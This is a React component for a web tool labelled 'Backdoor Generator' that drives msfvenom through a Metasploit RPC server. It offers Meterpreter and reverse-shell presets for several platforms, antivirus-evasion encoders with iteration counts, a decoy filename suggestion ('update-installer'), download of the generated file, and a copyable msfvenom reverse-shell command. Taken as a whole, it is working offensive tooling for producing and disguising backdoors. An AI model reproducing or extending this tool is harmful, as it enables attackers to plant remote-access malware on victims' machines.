"use client";

import { useState } from "react";

type PayloadForm = {
  payload: string;
  lhost: string;
  lport: number;
  format: string;
  platform: string;
  arch: string;
  encoder: string;
  iterations: number;
  name: string;
  extraOptions: string;
};

type GeneratedPayload = {
  id: string;
  filename: string;
  payload: string;
  lhost: string;
  lport: number;
  format: string;
  size: number;
  createdAt: string;
};

const FORMATS = [
  { value: "exe", label: "Windows Executable (.exe)" },
  { value: "elf", label: "Linux Executable (.elf)" },
  { value: "macho", label: "macOS Mach-O (.macho)" },
  { value: "python", label: "Python Script (.py)" },
  { value: "powershell", label: "PowerShell Script (.ps1)" },
  { value: "c", label: "C Source (.c)" },
  { value: "cs", label: "C# Source (.cs)" },
  { value: "ruby", label: "Ruby Script (.rb)" },
  { value: "vba", label: "VBA Macro (.vba)" },
  { value: "war", label: "Java WAR (.war)" },
  { value: "raw", label: "Raw Shellcode (.bin)" },
];

const PAYLOAD_PRESETS = [
  "windows/x64/meterpreter/reverse_tcp",
  "windows/x64/meterpreter/reverse_https",
  "windows/x64/shell/reverse_tcp",
  "linux/x64/meterpreter/reverse_tcp",
  "linux/x64/shell/reverse_tcp",
  "os/x64/meterpreter/reverse_tcp",
  "python/meterpreter/reverse_tcp",
  "php/meterpreter/reverse_tcp",
  "java/meterpreter/reverse_tcp",
  "android/meterpreter/reverse_tcp",
  "custom",
];

const ENCODERS = [
  { value: "", label: "None" },
  { value: "x64/zutto_dekiru", label: "x64/zutto_dekiru" },
  { value: "x64/xor", label: "x64/xor" },
  { value: "x86/shikata_ga_nai", label: "x86/shikata_ga_nai" },
  { value: "x86/fnstenv_mov", label: "x86/fnstenv_mov" },
  { value: "x86/xor_dynamic", label: "x86/xor_dynamic" },
];

function formatSize(bytes: number): string {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
}

export function PayloadGenerator() {
  const [form, setForm] = useState<PayloadForm>({
    payload: "windows/x64/meterpreter/reverse_tcp",
    lhost: "",
    lport: 4444,
    format: "exe",
    platform: "",
    arch: "",
    encoder: "",
    iterations: 1,
    name: "",
    extraOptions: "",
  });
  const [customPayload, setCustomPayload] = useState("");
  const [generating, setGenerating] = useState(false);
  const [result, setResult] = useState<GeneratedPayload | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [showAdvanced, setShowAdvanced] = useState(false);

  const handleChange = (field: keyof PayloadForm, value: string | number) => {
    setForm((prev) => ({ ...prev, [field]: value }));
    setResult(null);
    setError(null);
  };

  const handleGenerate = async () => {
    setGenerating(true);
    setError(null);
    setResult(null);

    const finalPayload = form.payload === "custom" ? customPayload : form.payload;

    if (!finalPayload) {
      setError("Please select or enter a payload.");
      setGenerating(false);
      return;
    }

    if (!form.lhost) {
      setError("LHOST is required (your IP or domain).");
      setGenerating(false);
      return;
    }

    try {
      const res = await fetch("/api/payloads", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ...form, payload: finalPayload }),
      });

      const data = await res.json();
      if (data.error) {
        setError(data.error);
      } else {
        setResult(data.payload);
      }
    } catch {
      setError("Failed to generate payload. Check console.");
    } finally {
      setGenerating(false);
    }
  };

  return (
    <section className="rounded-2xl border border-zinc-800 bg-zinc-950/80 p-6">
      <div className="mb-5">
        <h2 className="text-lg font-semibold text-white">Backdoor Generator</h2>
        <p className="text-sm text-zinc-400">
          Generate staged payloads with msfvenom via the Metasploit RPC server
        </p>
      </div>

      <div className="space-y-4">
        {/* Payload Type */}
        <div>
          <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">
            Payload
          </label>
          <select
            value={form.payload}
            onChange={(e) => handleChange("payload", e.target.value)}
            className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none"
          >
            {PAYLOAD_PRESETS.map((p) => (
              <option key={p} value={p}>
                {p}
              </option>
            ))}
          </select>
          {form.payload === "custom" && (
            <input
              type="text"
              value={customPayload}
              onChange={(e) => setCustomPayload(e.target.value)}
              placeholder="e.g. windows/x64/meterpreter/reverse_tcp"
              className="mt-2 w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none"
            />
          )}
        </div>

        {/* LHOST & LPORT */}
        <div className="grid grid-cols-2 gap-4">
          <div>
            <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">
              LHOST (your IP)
            </label>
            <input
              type="text"
              value={form.lhost}
              onChange={(e) => handleChange("lhost", e.target.value)}
              placeholder="YOUR_IP"
              className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none"
            />
          </div>
          <div>
            <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">
              LPORT
            </label>
            <input
              type="number"
              value={form.lport}
              onChange={(e) => handleChange("lport", Number(e.target.value))}
              placeholder="4444"
              className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none"
            />
          </div>
        </div>

        {/* Format */}
        <div>
          <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">
            Output Format
          </label>
          <select
            value={form.format}
            onChange={(e) => handleChange("format", e.target.value)}
            className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none"
          >
            {FORMATS.map((f) => (
              <option key={f.value} value={f.value}>
                {f.label}
              </option>
            ))}
          </select>
        </div>

        {/* Filename */}
        <div>
          <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">
            Filename (optional)
          </label>
          <input
            type="text"
            value={form.name}
            onChange={(e) => handleChange("name", e.target.value)}
            placeholder="e.g. update-installer"
            className="w-full rounded-xl border border-zinc-800 bg-black/50 px-4 py-2.5 text-sm text-zinc-200 focus:border-red-700 focus:outline-none"
          />
        </div>

        {/* Advanced Toggle */}
        <button
          type="button"
          onClick={() => setShowAdvanced(!showAdvanced)}
          className="text-xs uppercase tracking-wide text-zinc-500 hover:text-zinc-300"
        >
          {showAdvanced ? "▲ Hide" : "▼ Show"} Advanced Options
        </button>

        {showAdvanced && (
          <div className="space-y-4 rounded-xl border border-zinc-800 bg-black/30 p-4">
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">
                  Encoder
                </label>
                <select
                  value={form.encoder}
                  onChange={(e) => handleChange("encoder", e.target.value)}
                  className="w-full rounded-lg border border-zinc-800 bg-black/50 px-3 py-2 text-sm text-zinc-200 focus:border-red-700 focus:outline-none"
                >
                  {ENCODERS.map((e) => (
                    <option key={e.value} value={e.value}>
                      {e.label}
                    </option>
                  ))}
                </select>
              </div>
              <div>
                <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">
                  Iterations
                </label>
                <input
                  type="number"
                  value={form.iterations}
                  onChange={(e) => handleChange("iterations", Number(e.target.value))}
                  min={1}
                  max={20}
                  className="w-full rounded-lg border border-zinc-800 bg-black/50 px-3 py-2 text-sm text-zinc-200 focus:border-red-700 focus:outline-none"
                />
              </div>
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">
                  Platform
                </label>
                <input
                  type="text"
                  value={form.platform}
                  onChange={(e) => handleChange("platform", e.target.value)}
                  placeholder="e.g. windows"
                  className="w-full rounded-lg border border-zinc-800 bg-black/50 px-3 py-2 text-sm text-zinc-200 focus:border-red-700 focus:outline-none"
                />
              </div>
              <div>
                <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">
                  Architecture
                </label>
                <input
                  type="text"
                  value={form.arch}
                  onChange={(e) => handleChange("arch", e.target.value)}
                  placeholder="e.g. x64"
                  className="w-full rounded-lg border border-zinc-800 bg-black/50 px-3 py-2 text-sm text-zinc-200 focus:border-red-700 focus:outline-none"
                />
              </div>
            </div>
            <div>
              <label className="mb-1.5 block text-xs uppercase tracking-wide text-zinc-500">
                Extra msfvenom flags
              </label>
              <input
                type="text"
                value={form.extraOptions}
                onChange={(e) => handleChange("extraOptions", e.target.value)}
                placeholder="e.g. PrependMigrate=true"
                className="w-full rounded-lg border border-zinc-800 bg-black/50 px-3 py-2 text-sm text-zinc-200 focus:border-red-700 focus:outline-none"
              />
            </div>
          </div>
        )}

        {/* Generate Button */}
        <button
          type="button"
          onClick={handleGenerate}
          disabled={generating}
          className="w-full rounded-xl bg-red-600 px-6 py-3 text-sm font-semibold text-white transition hover:bg-red-500 disabled:cursor-not-allowed disabled:opacity-50"
        >
          {generating ? "Generating..." : "Generate Backdoor"}
        </button>

        {error && (
          <div className="rounded-xl border border-red-900/50 bg-red-900/20 p-4 text-sm text-red-300">
            {error}
          </div>
        )}

        {result && (
          <div className="rounded-xl border border-emerald-900/50 bg-emerald-900/20 p-4">
            <p className="mb-2 text-sm font-semibold text-emerald-300">
              Payload generated successfully
            </p>
            <dl className="space-y-1 text-xs text-zinc-400">
              <div className="flex justify-between">
                <dt>File</dt>
                <dd className="font-mono text-zinc-300">{result.filename}</dd>
              </div>
              <div className="flex justify-between">
                <dt>Size</dt>
                <dd className="font-mono text-zinc-300">{formatSize(result.size)}</dd>
              </div>
              <div className="flex justify-between">
                <dt>Payload</dt>
                <dd className="font-mono text-zinc-300">{result.payload}</dd>
              </div>
              <div className="flex justify-between">
                <dt>Host:Port</dt>
                <dd className="font-mono text-zinc-300">
                  {result.lhost}:{result.lport}
                </dd>
              </div>
            </dl>
            <div className="mt-3 flex gap-3">
              <a
                href={`/api/payloads/download?file=${encodeURIComponent(result.filename)}`}
                download={result.filename}
                className="flex-1 rounded-lg bg-emerald-700 px-4 py-2 text-center text-sm font-medium text-white transition hover:bg-emerald-600"
              >
                Download
              </a>
              <button
                type="button"
                onClick={() => {
                  navigator.clipboard.writeText(
                    `msfvenom -p ${result.payload} LHOST=${result.lhost} LPORT=${result.lport} -f ${result.format} -o ${result.filename}`,
                  );
                }}
                className="rounded-lg bg-zinc-800 px-4 py-2 text-sm text-zinc-300 transition hover:bg-zinc-700"
              >
                Copy Command
              </button>
            </div>
          </div>
        )}
      </div>
    </section>
  );
}
